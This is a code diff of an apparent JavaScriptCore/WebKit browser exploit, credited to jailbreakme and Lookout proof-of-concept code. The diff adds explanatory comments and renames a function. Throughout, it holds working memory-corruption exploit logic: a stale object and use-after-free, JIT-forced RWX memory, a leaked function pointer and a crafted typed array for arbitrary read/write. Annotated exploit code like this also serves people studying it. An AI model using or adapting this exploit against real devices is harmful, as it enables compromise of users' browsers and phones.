@@ -1,3 +1,5 @@
+// Based on https://jbme.qwertyoruiop.com/
+// and lookout PoC code.
  var mem0 = 0;
  var mem1 = 0;
  var mem2 = 0;
@@ -44,7 +46,7 @@ function dgc() {
  }
 
 
- function swag() {
+ function allocbufptrs() {
  	if (bufs[0]) return;
  	dgc();
  	dgc();
@@ -145,7 +147,7 @@ function dgc() {
  	not_number.toString = function() {
  		arr = null;
  		props["stale"]["value"] = null;
- 		swag();
+ 		allocbufptrs();
  		return 10;
  	};
  	var props = {
@@ -179,14 +181,19 @@ function dgc() {
  	stale[1] = {}
 	 
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
+	// This will force JS to create a r/w/x block of memory, with raw machine code,
+	// this block can then be written to.
  	for (var z = 0; z < 0x1000; z++) fc();
 	 
 	 
  	for (i = 0; i < bufs.length; i++) {
  		for (k = 0; k < bufs[0].length; k++) {
  			if (bufs[i][k] == 0x41414242) { // Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
- 				stale[0] = fc;
+ 				// Leak function pointer
+				stale[0] = fc;
  				fcp = bufs[i][k];
+				
+				
  				stale[0] = {
  					'a': u2d(105, 0x1172600),
  					'b': u2d(0, 0),
@@ -194,7 +201,18 @@ function dgc() {
  					'd': u2d(0x100, 0)
  				}
  				stale[1] = stale[0]
- 				bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+				
+				// ORIGINAL COMMENT: misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+				// MY COMMENT: Offset by 16 bytes to get past the JSCell inheirited fields.
+				// JSCell:
+				//	uint32: StructureID m_structureID;
+				//	uint8:	IndexingType m_indexingType;
+				//	enum:	JSType m_type;
+				//	uint8:	TypeInfo::InlineTypeFlags m_flags;
+				//	uint8:	uint8_t m_gcData;
+				bufs[i][k] += 0x10; 
+				
+				
  				bck = stale[0][4];
  				stale[0][4] = 0; // address, low 32 bits
  				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
